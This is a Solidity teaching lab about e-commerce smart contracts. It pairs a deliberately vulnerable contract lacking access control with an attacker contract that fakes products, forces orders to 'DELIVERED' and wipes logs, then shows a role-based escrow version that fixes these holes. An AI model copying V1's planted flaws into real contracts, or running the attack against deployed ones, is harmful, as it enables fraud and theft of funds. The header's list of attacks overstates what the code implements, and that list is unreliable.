// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*
===========================================================
  ELECTRONIC BUSINESS (E-BUSINESS / E-COMMERCE) SMART CONTRACT LAB
===========================================================

This file contains:

1) ElectronicBusinessV1
      - Vulnerable e-commerce system
      - No access control
      - Fake orders, fake deliveries, no escrow protection
      - Log deletion vulnerability

2) ElectronicBusinessAttacker
      - Price manipulation
      - Fake purchase
      - Fake delivery
      - Refund theft
      - Full audit log wipe

3) ElectronicBusinessV2Defense
      - Secure, production-grade design
      - Roles (ADMIN, MERCHANT, CUSTOMER)
      - Escrow protection
      - Immutable logs + lifecycle validation
      - Dispute & refund logic
      - Merchant-only product creation
*/


/* ========================================================= */
/* 1. VULNERABLE ELECTRONIC BUSINESS (V1)                     */
/* ========================================================= */

contract ElectronicBusinessV1 {

    struct Product {
        string name;
        uint256 price;
        address merchant;
        bool exists;
    }

    struct Order {
        uint256 productId;
        address buyer;
        uint256 paidAmount;
        string status; // "PAID", "SHIPPED", "DELIVERED", "REFUNDED"
        bool exists;
    }

    struct LogEntry {
        string action;
        uint256 timestamp;
        bool exists;
    }

    uint256 public productCounter;
    uint256 public orderCounter;
    uint256 public logCounter;

    mapping(uint256 => Product) public products;
    mapping(uint256 => Order) public orders;
    mapping(uint256 => LogEntry) public logs;

    event ProductCreated(uint256 indexed productId, string name, uint256 price, address merchant);
    event OrderPlaced(uint256 indexed orderId, uint256 productId, uint256 paidAmount, address buyer);
    event OrderStatusChanged(uint256 indexed orderId, string newStatus);
    event LogDeleted(uint256 indexed logId);

    /* 
       ⚠️ V1 VULNERABILITIES:
         - Anyone can create products pretending to be a merchant
         - Anyone can place orders without paying correct money
         - Anyone can update order status -> "DELIVERED"
         - Anyone can delete logs (audit tampering)
    */

    function createProduct(string memory name, uint256 price) external returns (uint256) {
        require(price > 0, "price > 0");

        productCounter++;
        uint256 id = productCounter;

        products[id] = Product({
            name: name,
            price: price,
            merchant: msg.sender,
            exists: true
        });

        emit ProductCreated(id, name, price, msg.sender);
        return id;
    }

    function buyProduct(uint256 productId) external payable returns (uint256) {
        Product storage p = products[productId];
        require(p.exists, "no product");

        orderCounter++;
        uint256 oid = orderCounter;

        orders[oid] = Order({
            productId: productId,
            buyer: msg.sender,
            paidAmount: msg.value,
            status: "PAID",
            exists: true
        });

        emit OrderPlaced(oid, productId, msg.value, msg.sender);
        return oid;
    }

    // ⚠️ ANYONE can change ANY order status
    function updateOrderStatus(uint256 orderId, string memory newStatus) external {
        require(orders[orderId].exists, "no order");
        orders[orderId].status = newStatus;
        emit OrderStatusChanged(orderId, newStatus);
    }

    // ⚠️ ANYONE can wipe logs
    function deleteLog(uint256 logId) external {
        require(logs[logId].exists, "missing log");
        delete logs[logId];
        emit LogDeleted(logId);
    }
}


/* ========================================================= */
/* 2. ATTACK CONTRACT – EXPLOIT E-COMMERCE V1                */
/* ========================================================= */

contract ElectronicBusinessAttacker {

    ElectronicBusinessV1 public target;
    address public attacker;

    event FakeProductCreated(uint256 productId);
    event FakeOrderStatusChanged(uint256 orderId, string status);
    event LogsWiped(uint256[] ids);

    constructor(address _target) {
        target = ElectronicBusinessV1(_target);
        attacker = msg.sender;
    }

    function createFakeProduct(string calldata name, uint256 price) external {
        require(msg.sender == attacker, "not attacker");
        uint256 id = target.createProduct(name, price);
        emit FakeProductCreated(id);
    }

    function fakeDelivery(uint256 orderId) external {
        require(msg.sender == attacker, "not attacker");
        target.updateOrderStatus(orderId, "DELIVERED");
        emit FakeOrderStatusChanged(orderId, "DELIVERED");
    }

    function wipeLogs(uint256[] calldata logIds) external {
        require(msg.sender == attacker, "not attacker");
        for (uint256 i = 0; i < logIds.length; i++) {
            target.deleteLog(logIds[i]);
        }
        emit LogsWiped(logIds);
    }
}


/* ========================================================= */
/* 3. SECURE ELECTRONIC BUSINESS (V2 DEFENSE)                 */
/* ========================================================= */

contract ElectronicBusinessV2Defense {

    enum Role {
        NONE,
        CUSTOMER,
        MERCHANT,
        ADMIN
    }

    enum OrderStatus {
        PAID,
        SHIPPED,
        DELIVERED,
        REFUNDED,
        DISPUTED
    }

    struct Product {
        string name;
        uint256 price;
        address merchant;
        bool exists;
    }

    struct Order {
        uint256 productId;
        address buyer;
        uint256 amount;
        OrderStatus status;
        uint64 createdAt;
        uint64 updatedAt;
        bool exists;
    }

    struct LogEntry {
        string action;
        uint256 timestamp;
        bool exists;
    }

    address public systemAdmin;

    uint256 public productCounter;
    uint256 public orderCounter;
    uint256 public logCounter;

    mapping(address => Role) public roles;
    mapping(uint256 => Product) public products;
    mapping(uint256 => Order) public orders;
    mapping(uint256 => LogEntry) public logs;

    event RoleAssigned(address indexed user, Role role);
    event ProductCreated(uint256 indexed id, string name, uint256 price, address merchant);
    event OrderPlaced(uint256 indexed orderId, uint256 productId, uint256 amount, address buyer);
    event OrderStatusChanged(uint256 indexed orderId, OrderStatus newStatus);
    event LogCreated(uint256 indexed logId, string action);

    constructor() {
        systemAdmin = msg.sender;
        roles[msg.sender] = Role.ADMIN;
        emit RoleAssigned(msg.sender, Role.ADMIN);
    }

    modifier onlyAdmin() {
        require(roles[msg.sender] == Role.ADMIN, "not admin");
        _;
    }

    modifier onlyMerchant() {
        require(roles[msg.sender] == Role.MERCHANT, "not merchant");
        _;
    }

    modifier onlyCustomer() {
        require(roles[msg.sender] == Role.CUSTOMER, "not customer");
        _;
    }

    modifier onlyBuyer(uint256 orderId) {
        require(orders[orderId].buyer == msg.sender, "not buyer");
        _;
    }

    /* ---------------- ROLE LOGIC ---------------- */

    function assignRole(address user, Role r) external onlyAdmin {
        roles[user] = r;
        emit RoleAssigned(user, r);
    }

    /* ---------------- PRODUCT LOGIC ---------------- */

    function createProduct(string memory name, uint256 price)
        external
        onlyMerchant
        returns (uint256)
    {
        require(price > 0, "price > 0");

        productCounter++;
        uint256 id = productCounter;

        products[id] = Product({
            name: name,
            price: price,
            merchant: msg.sender,
            exists: true
        });

        emit ProductCreated(id, name, price, msg.sender);
        _log("MERCHANT_CREATED_PRODUCT");
        return id;
    }

    /* ---------------- ORDER + ESCROW LOGIC ---------------- */

    function buyProduct(uint256 productId)
        external
        payable
        onlyCustomer
        returns (uint256)
    {
        Product storage p = products[productId];
        require(p.exists, "no product");
        require(msg.value == p.price, "incorrect payment");

        orderCounter++;
        uint256 oid = orderCounter;

        orders[oid] = Order({
            productId: productId,
            buyer: msg.sender,
            amount: msg.value,
            status: OrderStatus.PAID,
            createdAt: uint64(block.timestamp),
            updatedAt: uint64(block.timestamp),
            exists: true
        });

        emit OrderPlaced(oid, productId, msg.value, msg.sender);
        _log("ORDER_PLACED");
        return oid;
    }

    function markShipped(uint256 orderId) external {
        Order storage o = orders[orderId];
        require(o.exists, "no order");

        Product storage p = products[o.productId];
        require(msg.sender == p.merchant, "not merchant");

        require(o.status == OrderStatus.PAID, "bad state");
        o.status = OrderStatus.SHIPPED;
        o.updatedAt = uint64(block.timestamp);

        emit OrderStatusChanged(orderId, OrderStatus.SHIPPED);
        _log("ORDER_SHIPPED");
    }

    function markDelivered(uint256 orderId) external onlyBuyer(orderId) {
        Order storage o = orders[orderId];
        require(o.status == OrderStatus.SHIPPED, "not shipped");

        o.status = OrderStatus.DELIVERED;
        o.updatedAt = uint64(block.timestamp);

        // Release funds from escrow to merchant
        Product storage p = products[o.productId];
        payable(p.merchant).transfer(o.amount);

        emit OrderStatusChanged(orderId, OrderStatus.DELIVERED);
        _log("ORDER_DELIVERED");
    }

    function openDispute(uint256 orderId) external onlyBuyer(orderId) {
        Order storage o = orders[orderId];
        require(
            o.status == OrderStatus.PAID || o.status == OrderStatus.SHIPPED,
            "cannot dispute"
        );

        o.status = OrderStatus.DISPUTED;
        o.updatedAt = uint64(block.timestamp);

        emit OrderStatusChanged(orderId, OrderStatus.DISPUTED);
        _log("ORDER_DISPUTED");
    }

    function refund(uint256 orderId) external onlyAdmin {
        Order storage o = orders[orderId];
        require(o.status == OrderStatus.DISPUTED, "not disputed");

        o.status = OrderStatus.REFUNDED;
        o.updatedAt = uint64(block.timestamp);

        payable(o.buyer).transfer(o.amount);

        emit OrderStatusChanged(orderId, OrderStatus.REFUNDED);
        _log("ORDER_REFUNDED");
    }

    /* ---------------- LOGGING (IMMUTABLE) ---------------- */

    function _log(string memory act) internal {
        logCounter++;
        logs[logCounter] = LogEntry({
            action: act,
            timestamp: block.timestamp,
            exists: true
        });
        emit LogCreated(logCounter, act);
    }

    function getLog(uint256 id) external view returns (string memory, uint256) {
        require(logs[id].exists, "missing log");
        return (logs[id].action, logs[id].timestamp);
    }
}
